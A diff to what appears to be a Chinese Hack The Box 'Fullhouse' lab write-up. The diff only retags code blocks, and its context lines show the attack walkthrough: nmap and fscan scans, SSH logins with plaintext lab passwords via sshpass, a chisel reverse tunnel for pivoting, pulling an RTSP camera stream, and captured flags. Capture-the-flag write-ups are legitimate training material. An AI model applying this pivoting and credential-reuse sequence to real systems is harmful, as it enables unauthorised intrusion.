@@ -24,7 +24,7 @@
 
 ## CASINO 资产探测
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap -vv --min-rate 2000 -A -p- 10.13.38.31
 ......
@@ -82,7 +82,7 @@ start vulscan
 
 尝试直接请求
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ http get 10.13.38.31
 HTTP/1.1 301 Moved Permanently
@@ -387,7 +387,7 @@ slots_test:spVs9gvsk8p8lVJ
 
 尝试使用 `cassandra:spVs9gvsk8p8lVJ` 登录服务器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sshpass -p spVs9gvsk8p8lVJ ssh cassandra@casino.htb
 ......
@@ -399,7 +399,7 @@ cassandra
 
 在当前目录即可发现
 
-```shell
+```bash
 cassandra@casino:~$ ls -lh
 total 5.8M
 -rwxrwxr-x 1 cassandra cassandra 5.8M Aug 25  2024 agent
@@ -418,7 +418,7 @@ FHS{b4l4nc3_4ll_z3r0s_fr0m_sl0t5}
 
 探测一下基本情况
 
-```shell
+```bash
 (remote) cassandra@casino:/home/cassandra$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.13.38.31  netmask 255.255.254.0  broadcast 10.13.39.255
@@ -456,7 +456,7 @@ _gateway (10.13.38.2) at 00:50:56:94:40:64 [ether] on eth0
 
 上传 `fscan` 之后，对 `10.0.52.0/24` 进行探测
 
-```shell
+```bash
 (remote) cassandra@casino:/tmp$ ./fscan -h 10.0.52.31/24
 start ping
 (icmp) Target 10.0.52.5       is alive
@@ -484,7 +484,7 @@ start vulscan
 
 使用 `chisel` 建立中转枢纽
 
-```shell
+```bash
 # Local Kali
 ┌──(randark ㉿ kali)-[~]
 └─$ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
@@ -503,7 +503,7 @@ start vulscan
 
 使用 `nmap` 扫描
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo proxychains nmap --min-rate 5000 -T4 -sT -A --top-ports 100 10.0.52.5
 ......
@@ -525,7 +525,7 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 
 `22` 端口上的 `OpenSSH 9.3` 肯定不是目标，那么探测一下 RTSP 协议
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo proxychains nmap -sT -sCV --script "rtsp-*" -p 554 10.0.52.5
 Nmap scan report for bogon (10.0.52.5)
@@ -541,7 +541,7 @@ PORT    STATE SERVICE VERSION
 
 尝试连接一下，看一下视频流
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains ffmpeg -rtsp_transport tcp -i rtsp://10.0.52.5/mpeg4 -c copy out.mp4
 [proxychains] Strict chain  ...  127.0.0.1:10000  ...  10.0.52.5:554  ...  OK
@@ -574,7 +574,7 @@ frame= 2278 fps= 24 q=-1.0 Lsize=   70143KiB time=00:01:31.86 bitrate=6255.0kbit
 
 尝试使用这个密码登录服务器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sshpass -p 4vQ03013nKj9 ssh root@casino.htb
 ......
@@ -584,7 +584,7 @@ root
 
 ## FLAG - TRX leaves his mark
 
-```shell
+```bash
 root@casino:~# ls -lh
 total 4.0K
 -rw-r----- 1 root root 38 Nov  3  2023 flag.txt
@@ -604,7 +604,7 @@ FHS{1_th1nk_w3_4r3_b31ng_w4tch3d_O.O}
 
 不使用 Ping 进行探测
 
-```shell
+```bash
 (remote) root@casino:/tmp# ./fscan -np -h 10.0.52.111
 start infoscan
 10.0.52.111:443 open
@@ -623,7 +623,7 @@ start vulscan
 
 在已经得到完整权限的 `CASINO` 服务器上搜寻有用的音频文件
 
-```shell
+```bash
 (remote) root@casino:/tmp# find / -type f \( -name "*.mp3" -o -name "*.wav" -o -name "*.flac" -o -name "*.aac" -o -name "*.ogg" -o -name "*.m4a" \) 2>/dev/null
 /var/www/casino/static/audio/manifest.wav
 ```
@@ -687,7 +687,7 @@ model.save("exploit.h5")
 
 然后编译镜像并启动容器
 
-```shell
+```bash
 randark@developer:~/codes/Hackthebox-Fullhouse$ docker build -t fullhouse-exp .
 [+] Building 0.1s (7/7) FINISHED                                                                              docker:default
  => [internal] load build definition from Dockerfile                                                                    0.0s
@@ -734,7 +734,7 @@ total 20K
 
 然后将 `.h5` 提取出来
 
-```shell
+```bash
 root@e1cc11c93e27:~# exit
 exit
 randark@developer:~/codes/Hackthebox-Fullhouse$ docker ps -a
